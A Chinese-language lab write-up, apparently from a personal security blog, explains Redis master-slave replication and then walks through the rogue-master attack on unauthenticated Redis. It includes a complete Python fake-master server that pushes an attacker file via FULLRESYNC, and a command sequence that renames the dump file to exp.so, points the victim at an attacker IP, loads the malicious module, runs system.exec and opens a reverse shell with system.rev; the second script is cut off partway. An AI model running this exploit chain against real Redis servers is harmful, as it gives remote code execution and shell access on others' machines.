<pre class="line-numbers language-none"><code class="language-none">主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。

redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据时就会通过主从复制复制到其它从redis。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229153219790.png" alt="image-20231229153219790"></p>
<p>这里就跟着师傅搭建主从复制了，属实是不懂唉</p>
<p>建立主从复制，有3种方式：</p>
<ol>
<li>配置文件写入<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
<li>redis-server启动命令后加入 <code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
<li>连接到客户端之后执行：slaveof <code>&lt;master_ip&gt; &lt;master_port&gt;</code></li>
</ol>
<p><strong>PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p>
<p>我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380</p>
<p>这里我们在上面搭建的基础上，同一目录下新建redis6380文件，接着将之前已经有的redis目录下的redis.conf配置文件赋值到redis6380文件中，接着修改其中端口为6380即可</p>
<p>可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/manqishizhizhu/article/details/123772523?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170383537616800182744632%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=170383537616800182744632&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-123772523-null-null.142%5Ev99%5Epc_search_result_base2&amp;utm_term=centos7%E5%BC%80%E5%90%AF%E4%B8%A4%E4%B8%AAredis%E5%AE%9E%E4%BE%8B&amp;spm=1018.2226.3001.4187">Centos7搭建多个Redis实例</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-server /etc/redis/redis.conf 
redis-server /etc/redis/redis6380.conf <span class="token comment">#这里需要在redis-server服务所在目录下启动，而后面的内容为redis配置文件路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229155122022.png" alt="image-20231229155122022"></p>
<p>可以看到均启动成功</p>
<p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code> --这里这个师傅是将6380所在redis服务器当做主服务器了</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229155515379.png" alt="image-20231229155515379"></p>
<p>可以看到在成功设置主从关系之后，我们在6380主服务器上设置某些数据，之后在6379上可以看到数据的同步</p>
<p>如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
<h2 id="redis-module">redis module</h2>
<p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>
Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p>
<p>恶意so文件编写：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK">https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</a></p>
<h2 id="攻击原理">攻击原理</h2>
<p>利用步骤，贴一下PPT上的步骤</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229160136094.png" alt="image-20231229160136094"></p>
<p>slave和master的握手协议过程</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229160148389.png" alt="image-20231229160148389"></p>
<p>图中一些常量说明</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_CONNECTING</span> <span class="token expression"><span class="token number">2</span> </span><span class="token comment">/* 等待和master连接 */</span></span>
<span class="token comment">/* --- 握手状态开始 --- */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_RECEIVE_PONG</span> <span class="token expression"><span class="token number">3</span> </span><span class="token comment">/* 等待PING返回 */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_SEND_AUTH</span> <span class="token expression"><span class="token number">4</span> </span><span class="token comment">/* 发送认证消息 */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_RECEIVE_AUTH</span> <span class="token expression"><span class="token number">5</span> </span><span class="token comment">/* 等待认证回复 */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_SEND_PORT</span> <span class="token expression"><span class="token number">6</span> </span><span class="token comment">/* 发送REPLCONF信息，主要是当前实例监听端口 */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_RECEIVE_PORT</span> <span class="token expression"><span class="token number">7</span> </span><span class="token comment">/* 等待REPLCONF返回 */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_SEND_CAPA</span> <span class="token expression"><span class="token number">8</span> </span><span class="token comment">/* 发送REPLCONF capa */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_RECEIVE_CAPA</span> <span class="token expression"><span class="token number">9</span> </span><span class="token comment">/* 等待REPLCONF返回 */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_SEND_PSYNC</span> <span class="token expression"><span class="token number">10</span> </span><span class="token comment">/* 发送PSYNC */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_RECEIVE_PSYNC</span> <span class="token expression"><span class="token number">11</span> </span><span class="token comment">/* 等待PSYNC返回 */</span></span>
<span class="token comment">/* --- 握手状态结束 --- */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">REPL_STATE_TRANSFER</span> <span class="token expression"><span class="token number">12</span> </span><span class="token comment">/* 正在从master接收RDB文件 */</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的重点就是利用全量复制将master上的RDB文件同步到slave上，也就是将我们的恶意so文件传输到slave上，从而达到加载恶意so文件达到rce。</p>
<p>那为什么一定是全量复制呢，理由如下，当slave向master发送PSYNC命令之后，一般会得到三种回复：</p>
<ol>
<li>+FULLRESYNC：进行全量复制。</li>
<li>+CONTINUE：进行增量同步。</li>
<li>-ERR：当前master还不支持PSYNC。</li>
</ol>
<h3 id="全量复制的过程">全量复制的过程</h3>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229162001398.png" alt="image-20231229162001398"></p>
<ul>
<li>slave向master发送PSYNC请求，并携带master的runid和offest，如果是第一次连接的话slave不知道master的runid，所以会返回runid为<code>?</code>，offest为<code>-1</code>，<strong>我们来测试以下看看是不是真的如此</strong></li>
</ul>
<p>这里我们先对6379的redis输入slave no one，解除他与6380redis之间的主从关系，接着kali开启监听，在6379上设置kali为redis的主服务器</p>
<p>这里我操作失误了，连接第二次我才搞懂得干嘛。。。似乎就是redis连接你之后，你需要回复指定命令与其进行通信，最后返回master的runid和offest，即：</p>
<pre class="line-numbers language-none"><code class="language-none">主服务器需要执行的响应内容如下:

[&gt;] PING – 从服务器探测主服务器是否存活

[&lt;] +PONG  存活响应

[&gt;] REPLCONF – 交换主从节点复制信息

[&lt;] +OK     确认

[&gt;] PSYNC/SYNC – 同步状态以及传输方式

[&lt;] +FULLRESYNC  同步数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229163154621.png" alt="image-20231229163154621"></p>
<p>正确的应该是这样</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229163317518.png" alt="image-20231229163317518"></p>
<p>过程是这样的：</p>
<ul>
<li>master验证slave发来的runid是否和自身runid一致，如不一致，则进行全量复制。</li>
<li>master把自己的runid和offset发给slave，slave对master发来的runid和offest进行保存</li>
<li>master进行bgsave，生成RDB文件</li>
<li>master将写好的RDB文件传输给slave，并将缓冲区内的数据传输给slave</li>
<li>slave加载RDB文件和缓冲区数据</li>
</ul>
<h3 id="增量复制（部分复制）">增量复制（部分复制）</h3>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229163432449.png" alt="image-20231229163432449"></p>
<p>增量复制的过程这里简单带过一下：就是当slave向master要求数据同步时，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件</p>
<p>通过了解全量复制和增量复制的过程，我们应该大致知道为什么一定要用全量复制而不用增量复制了。</p>
<p>但是这样我感觉还是欠点什么，因为我认为我没有完全搞懂，又找了几篇文章发现这个解释的很好：</p>
<p>Redis提供了2种不同的持久化方式，RDB方式（在指定的时间间隔内生成数据集的时间点快照）和AOF方式（记录服务器执行的所有写操作命令）.AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过修改appendfilename参数进行修改，无法在客户端交互中动态设置appendfilename，而RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改。</p>
<p>这也说明了我们为何要选择RDB方式了。</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229163812136.png" alt="image-20231229163812136"></p>
<p>上图可以看到我们可以任意设置RDB文件名，但对于AOF却不行，而重点如下：</p>
<p>主从复制模式下数据单向从主节点流向从节点，<strong>在从节点首次注册时</strong>，会对主节点数据进行全量复制，复制过程中用offset记录读取的数据大小，以便中断后断点续传。如果从节点初始没有数据，通过主从复制，可以将主节点设置的dbfilename文件全量复制到从节点的dbfilename中，从而实现任意文件上传。</p>
<p>这也就说明了，攻击的时候似乎只能一次成功吗？毕竟如果第二次连接就不是首次注册了。。。</p>
<p>不过原理算是彻底明白了</p>
<h2 id="攻击流程">攻击流程</h2>
<p>第一个就是先配置一个攻击服务器，这个服务器是用于被受害者redis服务器连接的，也就是我们的靶机为从服务器，攻击机为主服务器（而恶意so文件就在我们的攻击机上）</p>
<p>而攻击机在于redis交互的过程中，需要发送如下信息：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PING 测试连接是否可用
+PONG 告诉slave连接可用
REPLCONF 发送REPLCONF信息，主要是当前实例监听端口
+OK 告诉slave成功接受
REPLCONF 发送REPLCONF capa
+OK 告诉slave成功接受
PSYNC <span class="token operator">&lt;</span>rundi<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>offest<span class="token operator">&gt;</span> 发送PSYNC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里样的话才算成功的冒充为了一名合格的redis主服务器</p>
<p>如下图所示：这里我就借用了~~</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229164232337.png" alt="image-20231229164232337"></p>
<p>而此时的redis从服务器需要主动的发送如下信息（实际就是我们操控它发送）</p>
<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">Config set dir ./  设置redis的备份路径为当前目录

Config set dbfilename test.so  修改备份文件名

SLAVEOF host port 设置为对应服务器的从节点

MODULE LOAD ./test.so 加载复制过来的

SLAVEOF no one  关闭主从复制关系(防止脏数据复制)

System.exec ‘command’ 执行命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="任意文件写入">任意文件写入</h3>
<p>这里呢，我是先配置的redis服务对外开放6379端口，ssrf后续再说，这里开启之后呢，我并没有对redis设置登录密码，但同时要设置取消保护模式，同时对于监听本地127.0.0.1的那一行需要注释掉</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229215205554.png" alt="image-20231229215205554"></p>
<p>接下来我们kali连接测试一下，如下图可以看到能成功连接</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229220359116.png" alt="image-20231229220359116"></p>
<p>这里的话先连接上redis-server，之后设置备份文件目录，以及备份文件名，然后执行slaveof使其成为我们恶意服务的从redis，恶意 master 在接收到 redis-server 的 <code>PSYNC</code> 命令后，返回 <code>FULLRESYNC</code> 命令，并将 payload 紧跟着发送。最终 payload 被写到 redis-server 的 <code>/var/www/html/exp.txt</code> 当中</p>
<p>恶意master如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> socketserver
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> time

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">,</span> <span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'&gt;&gt; %(message)s'</span><span class="token punctuation">)</span>

DELIMITER <span class="token operator">=</span> <span class="token string">b"\r\n"</span>

<span class="token keyword">class</span> <span class="token class-name">RoguoHandler</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'*'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span>DELIMITER<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'$'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>DELIMITER<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

        <span class="token keyword">return</span> data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"receive data: %r"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
            arr <span class="token operator">=</span> self<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'PING'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'+PONG'</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
            <span class="token keyword">elif</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'REPLCONF'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'+OK'</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
            <span class="token keyword">elif</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'PSYNC'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'SYNC'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'+FULLRESYNC '</span> <span class="token operator">+</span> <span class="token string">b'Z'</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token string">b' 1'</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'$'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>payload <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
                <span class="token keyword">break</span>

        self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">RoguoServer</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>
    allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> server_address<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>RoguoServer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>server_address<span class="token punctuation">,</span> RoguoHandler<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    expfile <span class="token operator">=</span> <span class="token string">'/home/hybcx/flag.txt'</span>  <span class="token comment">#我们要传输的恶意文件的路径</span>
    lport <span class="token operator">=</span> <span class="token number">6666</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>expfile<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        server <span class="token operator">=</span> RoguoServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> lport<span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] listening ......"</span><span class="token punctuation">)</span>
    server<span class="token punctuation">.</span>handle_request<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] completed ~~~"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>之后现在kali上执行如下命令：</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229220743984.png" alt="image-20231229220743984"></p>
<p>配置好之后，我们开启恶意master</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229221144741.png" alt="image-20231229221144741"></p>
<p>当其运行结束后，我们在靶机上即可查看到flag.txt被写入。这里肯定想着为何kali上执行个py就写入了呢，因为在此之前我们已经将我们的恶意master设置为了主redis，那我们在其中的任何操作，都可以同步到从redis，也就是我们的靶机，我们这里的py逻辑就是与从服务器命令交互完，直接发送payload，造成文件上传</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229221135874.png" alt="image-20231229221135874"></p>
<p>实际上细细研究发现这里似乎存在一个时间问题，比如我早就在从redis上配置好了我主redis的ip即端口，但此时主redis还没开启，是休眠状态，但一当我开启主redis，从redis就会向主redis发送PING命令，等待具体的回复，究竟是要进行全量复制，还是增量复制等等等等。而我们上述的恶意master会在从redis发送给我们PING命令之后给予相关的回应，最后发送给从redis进行全量复制的命令，最终导致我们的恶意文件上传效果。</p>
<h3 id="redis加载恶意-so"><a target="_blank" rel="noopener" href="http://xn--redis-j86ho04f88am66w.so">redis加载恶意.so</a></h3>
<p>这里思路大致与上述一直，这里我们改一下配置即可（注意这里依旧是利用redis未授权）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#设置redis的备份路径为当前目录</span>
config set dir <span class="token operator">.</span><span class="token operator">/</span>   
<span class="token comment">#设置备份文件名为exp.so，默认为dump.rdb</span>
config set dbfilename exp<span class="token operator">.</span>so
<span class="token comment">#设置主服务器IP和端口</span>
slaveof <span class="token number">192.168</span><span class="token number">.172</span><span class="token number">.129</span> <span class="token number">1234</span>  
<span class="token comment">#加载恶意模块</span>
module load <span class="token operator">.</span><span class="token operator">/</span>exp<span class="token operator">.</span>so
<span class="token comment">#执行系统命令</span>
system<span class="token operator">.</span>exec <span class="token string single-quoted-string">'whoami'</span>
system<span class="token operator">.</span>rev <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token number">9999</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231230161304017.png" alt="image-20231230161304017"></p>
<p>如图所示，配置好后我们开启恶意master，但这里不知道为何设置备份目录为当前的时候不成功。。。就先设置tmp了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> socketserver
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> time

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">,</span> <span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'&gt;&gt; %(message)s'</span><span class="token punctuation">)</span>

DELIMITER <span class="token operator">=</span> <span class="token string">b"\r\n"</span>

<span class="token keyword">class</span> <span class="token class-name">RoguoHandler</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'*'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span>DELIMITER<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'$'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>DELIMITER<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

        <span class="token keyword">return</span> data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"receive data: %r"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
            arr <span class="token operator">=</span> self<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'PING'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'+PONG'</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
            <span class="token keyword">elif</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'REPLCONF'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'+OK'</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
            <span class="token keyword">elif</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'PSYNC'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'SYNC'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'+FULLRESYNC '</span> <span class="token operator">+</span> <span class="token string">b'Z'</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token string">b' 1'</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'$'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>payload <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
                <span class="token keyword">break</span>

        self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

